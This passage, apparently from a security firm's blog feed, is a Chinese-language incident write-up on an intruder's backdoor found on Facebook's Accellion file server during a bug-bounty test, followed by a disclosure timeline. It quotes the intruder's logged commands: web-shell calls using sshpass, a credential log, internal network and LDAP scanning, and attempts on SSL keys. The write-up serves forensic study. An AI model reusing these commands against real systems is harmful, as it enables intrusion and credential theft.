+&lt;p&gt;整理一下，駭客做了一個 Proxy 在密碼驗證的地方，並且記錄 Facebook 員工的帳號密碼，並且將記錄到的密碼放置在 Web 目錄下，駭客每隔一段時間使用   wget 抓取&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-Z3OiEcB8VTg/VsNtaA_lgBI/AAAAAAAAA00/BiZzrwkXjR8/w649-h88-no/5.jpg&quot; alt=&quot;logged password&quot; /&gt;
+&lt;em&gt;↑ Logged passwords&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;從紀錄裡面可以看到除了使用者帳號密碼外，還有從 FTA 要求檔案時的信件內容，記錄到的帳號密碼會定時 Rotate (後文會提及，這點還滿機車的XD)&lt;/p&gt;
+
+&lt;p&gt;發現當下，最近一次的 Rotate 從 2/1 記錄到 2/7 共約 300 筆帳號密碼紀錄，大多都是 “&lt;strong&gt;@fb.com&lt;/strong&gt;” 或是 “&lt;strong&gt;@facebook.com&lt;/strong&gt;” 的員工帳密，看到當下覺得事情有點嚴重了，在 FTA 中，使用者的登入主要有兩種模式&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;一般用戶註冊，密碼 Hash 存在資料庫，由 SHA256 + SALT 儲存&lt;/li&gt;
+  &lt;li&gt;Facebook 員工 (@fb.com) 則走統一認證，使用 LDAP 由 AD 認證&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;在這裡相信記錄到的是真實的員工帳號密碼，&lt;strong&gt;**猜測&lt;/strong&gt;** 這份帳號密碼應該可以通行 Facebook Mail OWA, VPN 等服務做更進一步的滲透…&lt;/p&gt;
+
+&lt;p&gt;此外，這名 “駭客” 可能習慣不太好 :P&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;後門參數皆使用 GET 來傳遞，在網頁日誌可以很明顯的發現他的足跡&lt;/li&gt;
+  &lt;li&gt;駭客在進行一些指令操作時沒顧慮到 STDERR ，導致網頁日誌中很多指令的錯誤訊息，從中可以觀察駭客做了哪些操作&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;
+從 access.log 可以觀察到的每隔數日駭客會將記錄到的帳號密碼清空&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168.54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &amp;#39;12069238df&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&amp;#39; 2&amp;gt;/dev/stdout HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;打包檔案&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat tmp_list3_2 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; cp /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; 2&amp;gt;/dev/stdout
+tar -czvf files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;對內部網路結構進行探測&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
+telnet archibus.facebook.com 80
+curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;nb&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
+dig a records.fb.com
+telnet records.fb.com 80
+telnet records.fb.com 443
+wget -O- -q http://192.168.41.16
+dig a acme.facebook.com
+./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;for i in &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &amp;quot;192.168.&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&amp;quot;; done; done&amp;#39; 2&amp;gt;/dev/stdout
+...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;使用 Shell Script 進行內網掃描但忘記把 STDERR 導掉XD&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-kWigHQIuudM/VsNtaFXXiyI/AAAAAAAAA04/OoXNt7VeTcY/w1358-h732-no/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;嘗試對內部 LDAP 進行連接&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&amp;#39;
+sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &amp;#39;********&amp;#39; -s base (objectclass=*) 2&amp;gt;/dev/stdout&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;嘗試訪問內部網路資源&lt;br /&gt;
+( 看起來 Mail OWA 可以直接訪問 …)&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
+Resolving mail.thefacebook.com... 192.168.52.37
+Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://mail.thefacebook.com/owa/ [following]
+--20:38:10--  https://mail.thefacebook.com/owa/
+Reusing existing connection to mail.thefacebook.com:443.
+HTTP request sent, awaiting response... 302 Moved Temporarily
+Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
+--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
+Reusing existing connection to mail.thefacebook.com:443.
+HTTP request sent, awaiting response... 200 OK
+Length: 8902 (8.7K) [text/html]
+Saving to: `STDOUT&amp;#39;
+
+     0K ........                                              100% 1.17G=0s
+
+20:38:10 (1.17 GB/s) - `-&amp;#39; saved [8902/8902]
+
+--20:38:33--  (try:15)  https://10.8.151.47/
+Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
+Resolving svn.thefacebook.com... failed: Name or service not known.
+--20:39:03--  https://sb-dev.thefacebook.com/
+Resolving sb-dev.thefacebook.com... failed: Name or service not known.
+failed: Connection timed out.
+Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;嘗試對 SSL Private Key 下手&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;從瀏覽器觀察 files.fb.com 的憑證還是 Wildcard 的 *.fb.com …&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-tMk1LItZLMc/VsNtadzSINI/AAAAAAAAA08/RO9jDem_Iiw/w564-h511-no/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section-3&quot;&gt;後記&lt;/h3&gt;
+
+&lt;p&gt;在收集完足夠證據後便立即回報給 Facebook 安全團隊，回報內容除了漏洞細節外，還附上相對應的 Log 、截圖以及時間紀錄xD&lt;/p&gt;
+
+&lt;p&gt;從伺服器中的日誌可以發現有兩個時間點是明顯駭客在操作系統的時間，一個是七月初、另個是九月中旬&lt;/p&gt;
+
+&lt;p&gt;七月初的動作從紀錄中來看起來比較偏向 “逛” 伺服器，但九月中旬的操作就比較惡意了，除了逛街外，還放置了密碼 Logger 等，至於兩個時間點的 “駭客” 是不是同一個人就不得而知了 :P&lt;br /&gt;
+而七月發生的時機點正好接近 CVE-2015-2857 Exploit 公佈前，究竟是透過 1-Day 還是無 0-Day 入侵系統也無從得知了。&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;這件事情就記錄到這裡，總體來說這是一個非常有趣的經歷xD&lt;br /&gt;
+也讓我有這個機會可以來寫寫關於滲透的一些文章 :P&lt;/p&gt;
+
+&lt;p&gt;最後也感謝 Bug Bounty 及胸襟寬闊的 Facebook 安全團隊 讓我可以完整記錄這起事件 : )&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2016/02/05 20:05 提供漏洞詳情給 Facebook 安全團隊&lt;/li&gt;
+  &lt;li&gt;2016/02/05 20:08 收到機器人自動回覆&lt;/li&gt;
+  &lt;li&gt;2016/02/06 05:21 提供弱點 Advisory 給 Accellion 技術窗口&lt;/li&gt;
+  &lt;li&gt;2016/02/06 07:42 收到 Thomas 的回覆，告知調查中&lt;/li&gt;
+  &lt;li&gt;2016/02/13 07:43 收到 Reginaldo 的回覆，告知 Bug Bounty 獎金 $10000 USD&lt;/li&gt;
+  &lt;li&gt;2016/02/13 詢問是否撰寫 Blog 是否有任何要注意的地方?&lt;/li&gt;
+  &lt;li&gt;2016/02/13 詢問此漏洞被認為是 RCE 還是 SQL Injection&lt;/li&gt;
+  &lt;li&gt;2016/02/18 收到 Reginaldo 的回覆，告知正在進行調查中，希望 Blog 先暫時不要發出&lt;/li&gt;
+  &lt;li&gt;2016/02/24 收到 Hai 的回覆，告知獎金將會於三月發送&lt;/li&gt;
+  &lt;li&gt;2016/04/20 收到 Reginaldo 的回覆，告知調查已完成&lt;/li&gt;
+&lt;/ul&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>[已結束] DEVCORE 徵求行政出納人才</title>
